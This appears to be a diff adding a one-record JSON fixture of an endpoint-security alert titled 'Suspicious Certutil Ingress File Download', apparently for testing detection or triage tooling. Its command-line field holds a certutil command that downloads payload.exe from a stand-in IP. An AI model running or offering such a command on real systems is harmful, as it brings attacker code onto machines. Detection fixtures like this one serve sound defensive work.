@@ -1,0 +1,13 @@
+[
+  {
+    "Timestamp": "2026-11-09T10:11:00Z",
+    "DeviceName": "fin-pc-101.corp.example.internal",
+    "FileName": "certutil.exe",
+    "FolderPath": "C:\\Windows\\System32\\certutil.exe",
+    "InitiatingProcessFolderPath": "C:\\Windows\\explorer.exe",
+    "ProcessCommandLine": "certutil.exe -urlcache -split -f http://192.0.2.200/payload.exe",
+    "AccountName": "admin-temp",
+    "AlertTitle": "Suspicious Certutil Ingress File Download",
+    "AlertId": "Def-Alert-99120"
+  }
+]
